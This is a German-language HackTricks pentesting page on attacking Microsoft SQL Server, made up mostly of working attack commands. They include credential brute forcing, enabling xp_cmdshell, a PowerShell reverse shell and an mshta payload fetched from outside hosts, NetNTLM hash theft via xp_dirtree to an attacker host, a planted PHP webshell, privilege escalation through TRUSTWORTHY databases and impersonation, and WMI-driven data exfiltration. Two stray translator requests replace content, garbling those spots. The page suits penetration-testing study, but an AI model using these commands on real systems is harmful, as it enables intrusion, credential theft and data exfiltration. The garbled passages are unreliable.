# 1433 - Pentesting MSSQL - Microsoft SQL Server

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Von [wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server):

> **Microsoft SQL Server** ist ein **relationales Datenbankverwaltungssystem**, das von Microsoft entwickelt wurde. Als Datenbankserver ist es ein Softwareprodukt mit der primären Funktion, Daten zu speichern und abzurufen, wie von anderen Softwareanwendungen angefordert — die entweder auf demselben Computer oder auf einem anderen Computer über ein Netzwerk (einschließlich des Internets) ausgeführt werden können.

**Standardport:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### Einstieg in einen Managed Database-as-a-Service (DBaaS)

Alles, was davon abhängt, "owning the host" zu erreichen (z. B. privilege escalation, lateral movement, und OS command execution), entfällt in DBaaS. Pentesting in diesen Umgebungen muss sich auf application-layer exploitation, data exfiltration via SQL logic, misconfigured IAM roles oder schlechte network/VPC design verlagern. Zum Beispiel gibt die [Amazon RDS documentation](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/SQLServer.Concepts.General.FeatureNonSupport.html) ausdrücklich an, dass `xp_cmdshell` und die `TRUSTWORTHY` database property nicht unterstützt werden.

> [!WARNING]
> You get a database endpoint, not a server. The cloud provider manages the host OS, the database engine binaries, and many security policies.

### **Standard MS-SQL Systemtabellen**

- **master Database**: Diese Datenbank ist entscheidend, da sie alle systemweiten Details für eine SQL Server-Instanz enthält.
- **msdb Database**: Der SQL Server Agent nutzt diese Datenbank zur Verwaltung der Zeitplanung für Alerts und Jobs.
- **model Database**: Dient als Vorlage für jede neue Datenbank auf der SQL Server-Instanz; Änderungen wie Größe, collation, recovery model und mehr werden in neu erstellten Datenbanken übernommen.
- **Resource Database**: Eine schreibgeschützte Datenbank, die Systemobjekte enthält, die mit SQL Server geliefert werden. Diese Objekte sind physisch in der Resource database gespeichert, werden aber logisch im sys-Schema jeder Datenbank dargestellt.
- **tempdb Database**: Dient als temporärer Speicher für flüchtige Objekte oder Zwischenergebnismengen.

## Ermittlung

### Automatische Ermittlung

Wenn Sie nichts über den Service wissen:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
> [!TIP]
> Wenn du **keine** **credentials** hast, kannst du versuchen, sie zu erraten. Du kannst nmap oder metasploit verwenden. Sei vorsichtig, du kannst **accounts sperren**, wenn du mehrmals mit einem existierenden Benutzernamen fehlschlägst.
 
#### Metasploit (need creds)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-hacking/brute-force.md#sql-server)

### **Benutzeraufzählung über RID Brute Force**

Du kannst Domänenbenutzer über MSSQL durch brute-forcing von RIDs (Relative Identifiers) enumerieren. Diese Technik ist nützlich, wenn du gültige Zugangsdaten, aber eingeschränkte Rechte hast:
```bash
# Using NetExec (nxc) - formerly CrackMapExec
nxc mssql <IP> --local-auth -u <username> -p '<password>' --rid-brute 5000

# Examples:
nxc mssql 10.129.234.50 --local-auth -u sqlguest -p 'zDPBpaF4FywlqIv11vii' --rid-brute 5000
nxc mssql 10.10.10.59 -u sa -p 'P@ssw0rd' --rid-brute 10000

# Without --local-auth for domain accounts
nxc mssql 10.10.10.59 -u DOMAIN\\user -p 'password' --rid-brute 5000
```
Bitte fügen Sie den Inhalt von src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md ein, damit ich ihn ins Deutsche übersetzen kann.
```
[snippet]
MSSQL                    10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL                    10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL                    10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL                    10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL                    10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL                    10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
[snippet]
```
**Parameter:**
- `--local-auth`: Lokale Authentifizierung anstelle der Domain verwenden
- `--rid-brute <max_rid>`: Brute-force RIDs bis zur angegebenen Zahl (Standard: 4000)
- `-u`: Benutzername
- `-p`: Passwort

Diese Technik ermittelt Benutzer, indem sie den MSSQL-Server nach Kontoinformationen abfragt, die mit aufeinanderfolgenden RIDs verknüpft sind.

### Manuelle Enumeration

#### Anmeldung

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### Häufige Enumeration
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```
#### Benutzer abrufen


{{#ref}}
types-of-mssql-users.md
{{#endref}}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Berechtigungen erhalten

1. **Securable:** Bezeichnet die Ressourcen, die vom SQL Server zur Zugriffskontrolle verwaltet werden. Diese werden in folgende Kategorien eingeteilt:
- **Server** – Beispiele sind Datenbanken, logins, endpoints, availability groups und server roles.
- **Database** – Beispiele umfassen database role, application roles, schema, certificates, full text catalogs und users.
- **Schema** – Enthält tables, views, procedures, functions, synonyms usw.
2. **Permission:** In Zusammenhang mit SQL Server Securables können Berechtigungen wie ALTER, CONTROL und CREATE einem Principal gewährt werden. Die Verwaltung von Berechtigungen erfolgt auf zwei Ebenen:
- **Server Level** mit logins
- **Database Level** mit users
3. **Principal:** Dieser Begriff bezieht sich auf die Entität, der eine Berechtigung für ein Securable gewährt wird. Principals umfassen hauptsächlich logins und database users. Die Kontrolle des Zugriffs auf Securables erfolgt durch das Gewähren oder Verweigern von Berechtigungen oder durch das Aufnehmen von logins und users in Rollen, die über entsprechende Zugriffsrechte verfügen.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Tricks

### OS-Befehle ausführen

> [!CAUTION]
> Beachten Sie, dass, um Befehle ausführen zu können, nicht nur **`xp_cmdshell`** **aktiviert** sein muss, sondern auch die **EXECUTE-Berechtigung für die gespeicherte Prozedur `xp_cmdshell`** vorhanden sein muss. Sie können herausfinden, wer (außer sysadmins) **`xp_cmdshell`** verwenden kann, mit:
>
> ```sql
> Use master
> EXEC sp_helprotect 'xp_cmdshell'
> ```
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
```
### WMI-basierte remote SQL collection (sqlcmd + CSV export)

Operatoren können von einer IIS/app‑Tier zu SQL Servern pivotieren, indem sie WMI verwenden, um eine kleine Batch auszuführen, die sich bei MSSQL authentifiziert und ad‑hoc‑Abfragen ausführt und die Ergebnisse als CSV exportiert. Das hält die Erfassung einfach und tarnt sie als administrative Aktivität.

Beispiel mssq.bat
```bat
@echo off
rem Usage: mssq.bat <server> <user> <pass> <"SQL"> <out.csv>
set S=%1
set U=%2
set P=%3
set Q=%4
set O=%5
rem Remove headers, trim trailing spaces, CSV separator = comma
sqlcmd -S %S% -U %U% -P %P% -Q "SET NOCOUNT ON; %Q%" -W -h -1 -s "," -o "%O%"
```
Rufe es aus der Ferne per WMI auf.
```cmd
wmic /node:SQLHOST /user:DOMAIN\user /password:Passw0rd! process call create "cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd \"SELECT TOP(100) name FROM sys.tables\" C:\\Windows\\Temp\\out.csv"
```
PowerShell-Alternative
```powershell
$cmd = 'cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd "SELECT name FROM sys.databases" C:\\Windows\\Temp\\dbs.csv'
Invoke-WmiMethod -ComputerName SQLHOST -Class Win32_Process -Name Create -ArgumentList $cmd
```
Hinweise
- sqlcmd könnte fehlen; weiche auf osql, PowerShell Invoke-Sqlcmd oder einen One‑Liner zurück, der System.Data.SqlClient verwendet.
- Achte auf sorgfältiges Quoting; lange/komplexe Abfragen lassen sich einfacher über eine Datei oder ein Base64‑kodiertes Argument bereitstellen, das innerhalb des Batch-/PowerShell‑Stubs decodiert wird.
- Exfil the CSV via SMB (z. B. copy from \\SQLHOST\C$\Windows\Temp) oder komprimiere und verschiebe sie über deinen C2.



### Gehashte Passwörter abrufen
```bash
SELECT * FROM master.sys.syslogins;
```
### NetNTLM-Hash stehlen / Relay attack

Du solltest einen **SMB server** starten, um den in der Authentifizierung verwendeten Hash abzufangen (`impacket-smbserver` oder `responder` zum Beispiel).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
> [!WARNING]
> Sie können prüfen, wer (außer Sysadmins) Berechtigungen hat, diese MSSQL-Funktionen auszuführen, mit:
>
> ```sql
> Use master;
> EXEC sp_helprotect 'xp_dirtree';
> EXEC sp_helprotect 'xp_subdirs';
> EXEC sp_helprotect 'xp_fileexist';
> ```

Mit Tools wie **responder** oder **Inveigh** ist es möglich, **steal the NetNTLM hash**.\
Sie können sehen, wie man diese Tools verwendet in:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Missbrauch von MSSQL trusted Links

[**Read this post**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **um mehr Informationen darüber zu erhalten, wie diese Funktion missbraucht werden kann:**


{{#ref}}
../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md
{{#endref}}

### **Dateien schreiben**

Um Dateien mit `MSSQL` zu schreiben, müssen wir **aktivieren** [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), was Administratorrechte erfordert, und dann einige Stored Procedures ausführen, um die Datei zu erstellen:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Datei mit** OPENROWSET lesen

Standardmäßig erlaubt `MSSQL` das **Lesen jeder Datei im Betriebssystem, auf die das Konto Leserechte hat**. Wir können die folgende SQL-Abfrage verwenden:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Allerdings erfordert die **`BULK`**-Option die Berechtigung **`ADMINISTER BULK OPERATIONS`** oder **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Fehlerbasierter Vektor für SQLi:
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Dateien lesen und Skripte ausführen (Python und R)**

MSSQL kann es erlauben, dass Sie **Skripte in Python und/oder R** ausführen. Dieser Code wird von einem **anderen Benutzer** ausgeführt als der, der **xp_cmdshell** verwendet, um Befehle auszuführen.

Example trying to execute a **'R'** _"Hellow World!"_ **not working**:

![](<../../images/image (393).png>)

Example using configured python to perform several actions:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Registry auslesen

Microsoft SQL Server bietet **mehrere extended stored procedures**, mit denen Sie nicht nur mit dem Netzwerk, sondern auch mit dem Dateisystem und sogar der [**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:**

| **Regulär**                 | **Instanzbezogen**                   |
| --------------------------- | ------------------------------------ |
| sys.xp_regread              | sys.xp_instance_regread              |
| sys.xp_regenumvalues        | sys.xp_instance_regenumvalues        |
| sys.xp_regenumkeys          | sys.xp_instance_regenumkeys          |
| sys.xp_regwrite             | sys.xp_instance_regwrite             |
| sys.xp_regdeletevalue       | sys.xp_instance_regdeletevalue       |
| sys.xp_regdeletekey         | sys.xp_instance_regdeletekey         |
| sys.xp_regaddmultistring    | sys.xp_instance_regaddmultistring    |
| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Für **mehr Beispiele** siehe die [**Originalquelle**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/).

### RCE with MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Es ist möglich, eine **.NET dll innerhalb von MSSQL mit benutzerdefinierten Funktionen zu laden**. Dies erfordert jedoch **`dbo`-Zugriff**, daher benötigen Sie eine Verbindung zur Datenbank **als `sa` oder mit Administrator-Rechten**.

[**Folgen Sie diesem Link**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp), um ein Beispiel zu sehen.

### RCE with `autoadmin_task_agents`

Laut[ **diesem Beitrag**](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp), ist es auch möglich, eine entfernte dll zu laden und MSSQL dazu zu bringen, sie auszuführen, etwa mit:
```sql
update autoadmin_task_agents set task_assembly_name = "class.dll", task_assembly_path="\\remote-server\\ping.dll",className="Class1.Class1";
```
Bitte füge den Inhalt von src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md ein, damit ich ihn ins Deutsche übersetzen kann. Achte darauf, dass Tags, Links, Code und Pfade unverändert bleiben.
```csharp
using Microsoft.SqlServer.SmartAdmin;
using System;
using System.Diagnostics;

namespace Class1
{
public class Class1 : TaskAgent
{
public Class1()
{

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c ping localhost -t";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.WaitForExit();
}

public override void DoWork()
{

}

public override void ExternalJob(string command, LogBaseService jobLogger)
{

}

public override void Start(IServicesFactory services)
{

}

public override void Stop()
{

}


public void Test()
{

}
}
}
```
### Andere Methoden für RCE

Es gibt weitere Methoden, um Befehlsausführung zu erreichen, wie zum Beispiel das Hinzufügen von [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) und [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

## MSSQL Privilege Escalation

### Von db_owner zu sysadmin

Wenn ein **normaler Benutzer** die Rolle **`db_owner`** für die **von einem Admin besessene Datenbank** (z. B. **`sa`**) erhält und diese Datenbank als **`trustworthy`** konfiguriert ist, kann dieser Benutzer diese Rechte missbrauchen, um **privesc** zu erreichen, weil **stored procedures**, die dort erstellt werden, als der Besitzer (Admin) **ausgeführt** werden können.
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Sie können ein **metasploit**-Modul verwenden:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Oder ein **PS**-Skript:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Identitätsübernahme anderer Benutzer

SQL Server hat eine spezielle Berechtigung namens **`IMPERSONATE`**, die **dem ausführenden Benutzer ermöglicht, die Berechtigungen eines anderen Benutzers** oder Login anzunehmen, bis der Kontext zurückgesetzt wird oder die Sitzung endet.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# If you can't find any users, make sure to check for links
enum_links
# If there is a link of interest, re-run the above steps on each link
use_link [NAME]
```
> [!TIP]
> Wenn Sie sich als Benutzer ausgeben können, selbst wenn er kein sysadmin ist, sollten Sie prüfen **ob der Benutzer Zugriff hat** auf andere **Datenbanken** oder verknüpfte Server.

Beachten Sie, dass Sie, sobald Sie sysadmin sind, sich als jeden anderen ausgeben können:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Sie können diesen Angriff mit einem **metasploit**-Modul durchführen:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
oder mit einem **PS** script:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Verwendung von MSSQL für Persistenz

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## Extrahieren von Passwörtern aus SQL Server Linked Servers

Ein Angreifer kann Passwörter von SQL Server Linked Servers aus den SQL-Instanzen extrahieren und im Klartext erhalten, wodurch ihm Passwörter zur Verfügung stehen, die verwendet werden können, um einen größeren Fuß in das Zielsystem zu bekommen. Das Skript zum Extrahieren und Entschlüsseln der für die Linked Servers gespeicherten Passwörter ist [hier](https://www.richardswinbank.net/admin/extract_linked_server_passwords) zu finden.

Einige Voraussetzungen und Konfigurationen müssen erfolgen, damit dieser Exploit funktioniert. Zunächst müssen Sie Administratorrechte auf der Maschine haben oder die Möglichkeit besitzen, die SQL Server-Konfigurationen zu verwalten.

Nachdem Sie Ihre Berechtigungen überprüft haben, müssen Sie drei Dinge konfigurieren, und zwar:

1. TCP/IP auf den SQL Server-Instanzen aktivieren;
2. Einen Startparameter hinzufügen, in diesem Fall wird ein Trace-Flag hinzugefügt, nämlich -T7806.
3. Remote admin connection aktivieren.

Um diese Konfigurationen zu automatisieren, enthält [this repository ](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) die benötigten Skripte. Neben einem powershell script für jeden Konfigurationsschritt enthält das Repository auch ein vollständiges Skript, das die Konfigurationsskripte sowie das Extrahieren und Entschlüsseln der Passwörter kombiniert.

Für weitere Informationen verweisen die folgenden Links auf diesen Angriff: [Decrypting MSSQL Database Link Server Passwords](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[Troubleshooting the SQL Server Dedicated Administrator Connection](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Lokale Privilegieneskalation

Der Benutzer, der den MSSQL-Server ausführt, hat das Privilegentoken **SeImpersonatePrivilege.**\
Wahrscheinlich können Sie mithilfe einer der folgenden zwei Seiten auf den **Administrator** eskalieren:


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/juicypotato.md
{{#endref}}

## Shodan

- `port:1433 !HTTP`

## Referenzen

- [Unit 42 – Phantom Taurus: WMI-driven direct SQL collection via batch/sqlcmd](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
- [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/)
- [https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)
